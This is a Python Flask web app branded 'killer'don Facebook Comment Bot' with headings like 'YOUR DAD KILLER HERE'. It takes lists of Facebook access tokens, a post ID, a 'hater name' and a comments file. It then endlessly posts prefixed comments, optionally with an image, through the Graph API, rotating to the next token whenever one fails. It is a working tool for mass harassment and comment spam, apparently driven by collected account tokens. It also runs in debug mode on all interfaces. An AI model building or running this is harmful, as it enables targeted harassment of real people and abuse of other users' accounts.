from flask import Flask, render_template, request, jsonify, redirect, url_for
import requests
import json
import time
import os
import threading
import uuid
import base64
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Global dictionary to store running tasks
running_tasks = {}

class CommentBot:
    def __init__(self, task_id):
        self.task_id = task_id
        self.is_running = True
        running_tasks[task_id] = self
    
    def stop(self):
        self.is_running = False
        if self.task_id in running_tasks:
            del running_tasks[self.task_id]
    
    def post_comments(self, tokens, post_url, comments, haters_name, speed, image_path=None):
        requests.packages.urllib3.disable_warnings()
        
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; iPhone 10 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'
        }
        
        access_tokens = [token.strip() for token in tokens if token.strip()]
        num_tokens = len(access_tokens)
        num_comments = len(comments)
        max_tokens = min(num_tokens, num_comments)
        
        print(f"[{self.task_id}] Starting comment bot with {num_tokens} tokens and {num_comments} comments")
        
        comment_count = 0
        while self.is_running:
            try:
                for comment_index in range(num_comments):
                    if not self.is_running:
                        break
                        
                    comment = comments[comment_index].strip()
                    if not comment:
                        continue
                        
                    # Keep trying tokens until one works or we run out
                    token_attempts = 0
                    comment_posted = False
                    
                    while not comment_posted and token_attempts < max_tokens and self.is_running:
                        token_index = (comment_index + token_attempts) % max_tokens
                        access_token = access_tokens[token_index]
                        
                        url = f"https://graph.facebook.com/{post_url}/comments"
                        
                        # Prepare parameters for comment
                        parameters = {
                            'access_token': access_token, 
                            'message': f"{haters_name} {comment}"
                        }
                        
                        files = {}
                        
                        # If image is provided, add it to the request
                        if image_path and os.path.exists(image_path):
                            try:
                                with open(image_path, 'rb') as img_file:
                                    files['source'] = ('image.jpg', img_file, 'image/jpeg')
                                    response = requests.post(url, data=parameters, files=files, headers=headers)
                            except Exception as img_error:
                                print(f"[{self.task_id}] Image upload error: {img_error}, posting text only...")
                                response = requests.post(url, json=parameters, headers=headers)
                        else:
                            response = requests.post(url, json=parameters, headers=headers)
                        
                        try:
                            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                            
                            if response.ok:
                                comment_count += 1
                                print(f"[{self.task_id}] ✅ Comment #{comment_count} posted with Token #{token_index + 1}: {haters_name} {comment}")
                                print(f"  - Time: {current_time}")
                                comment_posted = True
                            else:
                                print(f"[{self.task_id}] ❌ Token #{token_index + 1} failed, switching to next token immediately...")
                                token_attempts += 1
                        except Exception as e:
                            print(f"[{self.task_id}] ❌ Token #{token_index + 1} error: {e}, switching to next token...")
                            token_attempts += 1
                    
                    if not comment_posted and self.is_running:
                        print(f"[{self.task_id}] ⚠️ All {max_tokens} tokens failed for: {haters_name} {comment}")
                    
                    if self.is_running:
                        time.sleep(speed)
                
                if self.is_running:
                    print(f"[{self.task_id}] Completed one full cycle. Restarting...")
                    
            except Exception as e:
                print(f"[{self.task_id}] Error in comment loop: {e}")
                if self.is_running:
                    time.sleep(5)
        
        print(f"[{self.task_id}] Comment bot stopped.")

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>💔KILLER</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.postimg.cc/WbZ7KfQF/1756132465347.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center center;
      background-attachment: fixed;
      min-height: 100vh;
      color: white;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px rgba;
      border: none;
      resize: none;
    }
    .form-control {
      outline: 1px blue;
      border: 1px double #C51077;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 1px;
      margin-bottom: 2px;
      border-radius: 2px;
      color: #C51077;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 20px; }
    .footer { text-align: center; margin-top: 20px; color: #C51077; }
    .whatsapp-link {
      display: ;
      color: #C51077;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
    .alert {
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">YOUR DAD KILLER HERE</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data" action="/start">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Post/Thread ID</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Time Delay (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" min="1" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Comments File (.txt)</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="imageFile" class="form-label">Image to Post (Optional)</label>
        <input type="file" class="form-control" id="imageFile" name="imageFile" accept=".jpg,.jpeg,.png,.gif">
        <small class="text-light">Upload an image to post with your comments</small>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Start Bot</button>
    </form>
    
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Bot</button>
    </form>
    
    <div class="mt-3">
      <a href="/status" class="btn btn-info">View Active Tasks</a>
    </div>
  </div>
  
  <footer class="footer">
    <p>© 2025 Killer don here</p>
    <p>Haters <a href="https://www.facebook.com/profile.php?id=100088122849082">FB</a></p>
    <div class="mb-3">
      <a href="https://www.facebook.com/profile.php?id=100088122849082" class="FB-link">
        <i class="fab fa-facebook"></i> Chat on FB
      </a>
    </div>
  </footer>
  
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
    '''

@app.route('/start', methods=['POST'])
def start_bot():
    try:
        # Get form data
        token_option = request.form.get('tokenOption')
        thread_id = request.form.get('threadId')
        hater_name = request.form.get('kidx')
        delay_time = int(request.form.get('time'))
        
        # Handle tokens
        tokens = []
        if token_option == 'single':
            single_token = request.form.get('singleToken')
            if single_token:
                tokens = [single_token]
        else:
            token_file = request.files.get('tokenFile')
            if token_file:
                tokens = token_file.read().decode('utf-8').splitlines()
        
        # Handle comments file
        comments_file = request.files.get('txtFile')
        comments = []
        if comments_file:
            comments = comments_file.read().decode('utf-8').splitlines()
        
        # Handle image file
        image_path = None
        image_file = request.files.get('imageFile')
        if image_file and image_file.filename:
            # Create uploads directory if it doesn't exist
            os.makedirs('uploads', exist_ok=True)
            
            # Save the uploaded image
            filename = secure_filename(image_file.filename)
            image_path = os.path.join('uploads', f"{str(uuid.uuid4())[:8]}_{filename}")
            image_file.save(image_path)
            print(f"Image saved to: {image_path}")
        
        if not tokens:
            return jsonify({'error': 'No tokens provided'}), 400
        if not comments:
            return jsonify({'error': 'No comments provided'}), 400
        
        # Generate unique task ID
        task_id = str(uuid.uuid4())[:8]
        
        # Create and start bot
        bot = CommentBot(task_id)
        thread = threading.Thread(
            target=bot.post_comments,
            args=(tokens, thread_id, comments, hater_name, delay_time, image_path)
        )
        thread.daemon = True
        thread.start()
        
        return f'''
        <div style="text-align: center; padding: 50px; background: linear-gradient(45deg, #FFD700, #FFA500); color: #333;">
            <h2>✅ Bot Started Successfully!</h2>
            <p><strong>Task ID:</strong> {task_id}</p>
            <p>{"📸 Image will be posted with comments" if image_path else "💬 Text comments only"}</p>
            <p>Save this Task ID to stop the bot later.</p>
            <a href="/" style="color: #333; text-decoration: none;">← Go Back</a>
        </div>
        '''
        
    except Exception as e:
        return f'''
        <div style="text-align: center; padding: 50px; background: #ff6b6b; color: white;">
            <h2>❌ Error Starting Bot</h2>
            <p>Error: {str(e)}</p>
            <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
        </div>
        '''

@app.route('/stop', methods=['POST'])
def stop_bot():
    task_id = request.form.get('taskId')
    
    if task_id in running_tasks:
        running_tasks[task_id].stop()
        return f'''
        <div style="text-align: center; padding: 50px; background: #4ecdc4; color: white;">
            <h2>🛑 Bot Stopped Successfully!</h2>
            <p>Task ID: {task_id} has been stopped.</p>
            <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
        </div>
        '''
    else:
        return f'''
        <div style="text-align: center; padding: 50px; background: #ff6b6b; color: white;">
            <h2>❌ Task Not Found</h2>
            <p>No running task found with ID: {task_id}</p>
            <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
        </div>
        '''

@app.route('/status')
def status():
    active_tasks = list(running_tasks.keys())
    return f'''
    <div style="text-align: center; padding: 50px; background: #45b7d1; color: white;">
        <h2>📊 Active Tasks</h2>
        {f"<p>Active Task IDs: {', '.join(active_tasks)}</p>" if active_tasks else "<p>No active tasks</p>"}
        <a href="/uploads" style="color: white; text-decoration: none;">📸 View Uploaded Images</a><br><br>
        <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
    </div>
    '''

@app.route('/uploads')
def view_uploads():
    uploads_dir = 'uploads'
    if not os.path.exists(uploads_dir):
        return '''
        <div style="text-align: center; padding: 50px; background: #ff6b6b; color: white;">
            <h2>📸 No Images Uploaded</h2>
            <p>Upload an image using the main form first.</p>
            <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
        </div>
        '''
    
    files = os.listdir(uploads_dir)
    image_files = [f for f in files if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif'))]
    
    if not image_files:
        return '''
        <div style="text-align: center; padding: 50px; background: #ff6b6b; color: white;">
            <h2>📸 No Images Found</h2>
            <p>Upload an image using the main form first.</p>
            <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
        </div>
        '''
    
    gallery_html = '''
    <div style="text-align: center; padding: 50px; background: #45b7d1; color: white;">
        <h2>📸 Uploaded Images</h2>
        <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin: 20px 0;">
    '''
    
    for img in image_files:
        gallery_html += f'''
        <div style="border: 2px solid white; padding: 10px; border-radius: 10px;">
            <img src="/uploads/{img}" style="max-width: 200px; max-height: 200px; border-radius: 5px;">
            <p style="margin: 10px 0 0 0; font-size: 12px;">{img}</p>
        </div>
        '''
    
    gallery_html += '''
        </div>
        <a href="/" style="color: white; text-decoration: none;">← Go Back</a>
    </div>
    '''
    
    return gallery_html

from flask import send_from_directory

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory('uploads', filename)

if __name__ == '__main__':
    print("👑 killer'don Facebook Comment Bot Web App 👑")
    print("Starting server on http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, debug=True)
